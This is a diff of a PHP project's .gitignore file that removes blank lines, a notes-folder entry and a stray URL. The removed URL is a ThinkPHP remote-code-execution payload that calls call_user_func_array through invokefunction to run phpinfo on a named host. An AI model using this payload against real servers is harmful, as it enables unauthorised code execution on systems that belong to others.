@@ -3,14 +3,7 @@ composer.lock
 /config
 /extend/*
 /public/install.lock
-
-
 /application/common/controller/base_back
 /application/common/controller/Base.php
-/笔记
 /application
-
 /vendor
-
-
-http://plugin_x1.zfcms.90ckm.com/twothink-master/public/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
